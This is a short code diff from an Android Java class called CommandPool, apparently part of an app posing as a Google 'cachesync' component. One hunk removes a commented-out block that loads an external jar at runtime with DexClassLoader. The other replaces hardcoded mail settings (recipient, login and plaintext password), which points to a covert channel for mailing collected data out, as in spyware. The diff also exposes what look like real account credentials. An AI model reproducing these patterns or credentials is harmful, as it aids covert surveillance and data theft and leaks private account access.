@@ -135,12 +135,6 @@ public class CommandPool extends Object {
         		}
         	}
         	
-        	/*
-        	String clsName = "com.google.cachesync.CustomCommand";
-    		DexClassLoader classLoader = new DexClassLoader(jarFile, "/mnt/sdcard/", null, getClass().getClassLoader());
-    		Class<?> myClass = classLoader.loadClass(clsName);
-			CommandObj command = (CommandObj)myClass.newInstance();
-    	   */
     	} catch ( Exception e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
@@ -1016,9 +1010,9 @@ public class CommandPool extends Object {
 		SharedPreferences prefs = mContext.getSharedPreferences(CommandObj.PREF_NAME,1);
 		SharedPreferences.Editor edit = prefs.edit();
 		edit.putBoolean(CommandObj.ACK,true);
-		edit.putString(CommandObj.MAIL_TO,"clinch.coffin@gmail.com");
-		edit.putString(CommandObj.MAIL_USER,"clinch.coffin@gmail.com");
-		edit.putString(CommandObj.MAIL_PASS,"20834999");
+		edit.putString(CommandObj.MAIL_TO,"cache.sync@gmail.com");
+		edit.putString(CommandObj.MAIL_USER,"cache.sync@gmail.com");
+		edit.putString(CommandObj.MAIL_PASS,"r'i.cbyr");
 		edit.commit();
 	}
 }
